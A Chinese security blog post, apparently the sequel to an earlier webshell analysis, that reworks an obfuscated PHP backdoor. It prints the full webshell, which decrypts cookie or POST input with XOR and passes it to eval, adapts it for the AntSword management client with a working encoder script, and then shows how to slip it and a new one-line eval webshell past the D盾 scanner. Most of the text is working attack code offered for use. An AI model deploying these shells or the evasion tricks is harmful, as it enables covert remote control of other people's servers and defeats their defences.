## 前情提要

> [记一次对php猥琐马的爆菊分析（上）](https://www.freebuf.com/articles/web/252089.html)

##  **0x00 前言**

仔细看了地气哥的一篇木马分析文章（https://www.freebuf.com/articles/web/252089.html），从中学习到了很多东西，非常感谢地气给我带来的知识，不然可能并没有此文。

##  **0x01 问题分析**

![](https://image.3001.net/images/20201015/1602749225_5f880329b98926588d089.png!small)
在地气文章末尾留下了送给大家的彩蛋（认真读文章的我肯定不会中标~）。  
下边就和大家分享一下彩蛋的蛋是怎么玩儿的。

![](https://image.3001.net/images/20201015/1602749267_5f880353afeb542bc3306.png!small)

在地气哥Payload工具中，key的值被复制了多次，为的是当我们输入Payload语句被程序进行serialize之后，将每一位都进行ASCII码后的异或运算，来逆推出加密的Base64代码，我们可以从第25-28行的语句中看到逆推过程，是因为从substr中来逐步ASCII码。

我们看一下当substr函数返回空时，情况是怎么样的。

![](https://image.3001.net/images/20201015/1602749292_5f88036cbff23b77574e7.png!small)

我们看到，当substr截取不到任何东西时，PHP返回“空”，但是在进行ord强制转换后，返回的是实打实的0，因为地气哥中的key是写死的，当我们生成的Payload比较多的时候，就会出现0去异或程序中生成的第一次加密Payload某一位的情况，这显然是不合理的。

##  **0x02 问题解决**

  
解决该问题最有效的方法应该就是让程序动态的去复制粘贴Key，这样可以达到长度无限的情况。  
这里笔者粘贴出已修改的脚本：

![](https://image.3001.net/images/20201015/1602749342_5f88039e864e222b4d2fc.png!small)

    
    
    <?php
    $str = array(
        'ak'    =>  'aec7e489-2fbc-4b15-871f-1d686eeb80dc',
        'a'     =>  'e',
        'd'     =>  $_GET['payload']
    );
    
    $seria = serialize($str);
    
    $cookiepre = '';
    $pass = str_repeat('t', strlen($seria) - 1);
    $text = '';
    for($i = 0; $i < strlen($seria); $i++){
        $text .= chr(ord($seria[$i]) ^ ord($pass));
    }
    
    echo $pass . '<br>';
    
    $key = $str['ak'];
    $value = '';
    for($i = 0; $i < strlen($text); $i++){
        if(!$key[$i]){
            $key .= $str['ak'];
        }
        $value .= chr(ord($text[$i]) ^ ord($key[$i]));
    }
    echo base64_encode($value);
    

测试效果：

![](https://image.3001.net/images/20201015/1602749378_5f8803c24cd702cb5f594.png!small)

成功解决了Payload长度问题。

##  **0x03 神兵利器，何不利用？**

  
既然解决了Payload长度问题，那么如果我们可以将该马儿更加方便的使用，那该多好啊。  
笔者想到的是，如果可以使用蚁剑去连接，那岂不是舒服的很。毕竟该国外马儿加密的流量非常强悍的。  
当然我们要想要与蚁剑进行交互，我们首先要解决一个问题，该问题是马儿中的unserialize函数。

![](https://image.3001.net/images/20201015/1602749425_5f8803f15e2b02f81f73f.png!small)

Unserialize函数是用来反序列化的，但是他方便了PHP的同时却不太适合蚁剑，因为蚁剑是基于nodeJs而开发，同时遵循了Js的语法规则，我们知道在Js中定义数组必须为索引下标，在PHP中定义数组下标可以是字符串类型，这牵扯到了该马儿的核心：第48行的$vv[‘ak’]。如果我们使用unserialize函数，可能不太方便Js与PHP的交互。

在一个正常的WEB应用中，前台（Js）与后台（PHP/JAVA等）语言中，Json为主要的传输数据的格式，这里笔者将unserialize函数改为json_decode。如图：

![](https://image.3001.net/images/20201015/1602749450_5f88040a05d4db16c8211.png!small)

这样起来我们就可以在nodeJs与PHP之间搭建一个沟通的桥梁。

新马儿代码：

    
    
    <?php
    $da59aa5 = 208;
    $GLOBALS['w8fd00d8'] = Array();
    global $w8fd00d8;
    $w8fd00d8 = $GLOBALS;
    ${"\x47\x4c\x4fB\x41\x4c\x53"}['a904'] = "\x2f\x25\x32\x54\x75\x3a\x5e\x36\x31\x48\x21\x5b\x30\x66\x20\x5f\x56\x5a\x4d\x23\x3e\x37\x71\x29\x26\x2c\x68\x7e\x5c\x9\x64\x69\x6e\x3c\x6b\x2b\x61\x2d\x4a\x47\x42\x7c\xa\x6a\x7b\x6f\x52\x27\x4c\x39\x55\x63\x4b\x7a\x49\x3f\x5d\x76\x33\x59\x43\x62\x24\x38\x79\x70\x72\x67\x28\x35\x46\x3d\x7d\x65\x57\x41\x53\x44\x73\x60\x58\x34\x77\x22\x6c\x6d\x4e\x45\x4f\x40\x78\x74\x50\xd\x2a\x2e\x3b\x51";
    @ini_set('error_log', NULL);
    @ini_set('log_errors', 0);
    @ini_set('max_execution_time', 0);
    @set_time_limit(0);
    if (!defined('ALREADY_RUN_366afb8a8a2355ab21fbf11ba1a02fba')){
            define('ALREADY_RUN_366afb8a8a2355ab21fbf11ba1a02fba', 1);
            $vv = NULL;
            $kk = NULL;
            $w8fd00d8['c77700426'] = 'aec7e489-2fbc-4b15-871f-1d686eeb80dc';
            global $c77700426;
            function  e664fd($vv, $kk){
            global $w8fd00d8;
            $n513761 = "";
            for ($i=0;$i<strlen($vv);){
                    for ($p=0;$p<strlen($kk) && $i<strlen($vv);$p++, $i++){
                            $n513761 .= chr(ord($vv[$i]) ^ ord($kk[$p]));
                    }
            }
            return $n513761;
            }
    
            function  x184f5cc($vv, $kk){
                    global $w8fd00d8;
                    global $c77700426;
                    return e664fd(e664fd($vv, $c77700426), $kk);
            }
    
            foreach ($_COOKIE as $k=>$v){
            $vv = $v;
            $kk = $k;
            }
    
            if (!$vv){
                    foreach ($_POST as $k=>$v){
                    $vv = $v;
                    $kk = $k;
                    }
            }
    
            $vv = @json_decode(x184f5cc(base64_decode($vv), $kk), true);
            
            if (isset($vv['a'.'k']) && $c77700426==$vv['a'.'k']){
                    if ($vv['a'] == 'i'){
                            $l71c40 = Array('p'.'v' => @phpversion(),'s'.'v' => '1'.'.'.'0'.'-'.'1',);
                            echo @serialize($l71c40);
                    }
                    elseif ($vv['a'] == 'e'){
                    eval/*r49557ec*/($vv['d']);
                    }
                    }
                    exit();
            }
    
    ?>

##  **0x04 蚁剑改造及使用演示**

  
下边笔者就编写了一个蚁剑的编码器，他用于链接该木马。  
编码器代码:

    
    
    /**
     * php::base64编码器
     * Create at: 2020/10/14 13:38:35
     */
    
    'use strict';
    /*
    * @param  {String} pwd   连接密码
    * @param  {Array}  data  编码器处理前的 payload 数组
    * @return {Array}  data  编码器处理后的 payload 数组
    */
    module.exports = (pwd, data, ext={}) => {
      // ##########    请在下方编写你自己的代码   ###################
      // 以下代码为 PHP Base64 样例
      let obj = {'ak':'aec7e489-2fbc-4b15-871f-1d686eeb80dc','a':'e','d':data['_']};
      let objStr = JSON.stringify(obj);
      // 生成一个随机变量名
      let pass = 't';
      let t = pass.repeat(obj.d.length - 1);
      
      let text = '';
      for(let i = 0; i < objStr.length; i ++){
        text += String.fromCharCode(objStr[i].charCodeAt() ^ t.charCodeAt());
      }
      let key = obj.ak;
      var value = '';
      for(let i = 0; i < text.length; i++){
        if(!key[i]){
          key += obj.ak;
        }
        value += String.fromCharCode(text[i].charCodeAt() ^ key[i].charCodeAt());
      }
      data[t] = Buffer.from(value).toString('base64');
      
    
      // ##########    请在上方编写你自己的代码   ###################
    
      // 删除 _ 原有的payload
      delete data['_'];
      // 返回编码器处理后的 payload 数组
      return data;
    }

当然，该编码器的第15行的ak值，需要与马儿中的key所对应。

演示：

![](https://image.3001.net/images/20201015/1602749526_5f8804563de6e0fc866cc.gif)

（马儿密码任意即可）

##  **0x05 狗儿的友情提示**

  
该马儿流量是很强悍了，但是脚本本身并不免杀。  
我们看一下马儿被D盾吊锤：

![](https://image.3001.net/images/20201015/1602749591_5f880497ea1a9a5e66a3f.png!small)

怎么办呢？绕啊，这么好的马子，编码器都完成了，不能前功尽弃！

看到提示eval后门，参数$vv那边有问题，我们看一下：

![](https://image.3001.net/images/20201015/1602749626_5f8804ba01aef38848e5b.png!small)

很简单，使用NULL拼接大法（虽然一些普遍的马儿都已经过不了了）。

![](https://image.3001.net/images/20201015/1602749646_5f8804cef1ee28f58ae36.png!small)

现在不报eval的错误了，有戏！

可以看到爆出$GLOBALS的错误，我们直接转移到第6行看一下。

![](https://image.3001.net/images/20201015/1602749676_5f8804ec4affe588c02e6.png!small)

该代码对整个马儿不太影响，直接删掉！

![](https://image.3001.net/images/20201015/1602749699_5f880503110d289407c81.png!small)

我们在看一下结果：

![](https://image.3001.net/images/20201015/1602749722_5f88051ad714629ee07ce.png!small)

ByPass！

##  **0x06 通过该马解锁的绕过方式**

  
通过地气哥的一些分析，从其中得到一些灵感，NULL拼接不再孤独，再次奔放~！  
之前一直疏忽一个问题，$GLOBALS到底里面存放一些什么东西，今天，我们var_dump一下看看。

![](https://image.3001.net/images/20201015/1602749762_5f8805425b20c5211e2e5.png!small)

可以看到$_GET/$_POST/$_COOKIE都存放在这些东西里面。

这个时候笔者想到了eval/**/()格式，以及一些变量值的混淆，写出第二个简约一句话木马。

    
    
    <?php
    $a = $GLOBALS;
    $str = '_GET';
    eval(''. $a[$str]['c']. NULL);

Phpinfo:

![](https://image.3001.net/images/20201015/1602749800_5f88056871b7739d152e5.png!small)

D盾测试:

![](https://image.3001.net/images/20201015/1602749822_5f88057ea32da1568459b.png!small)

2020年10月14日22点38分正常过D盾！

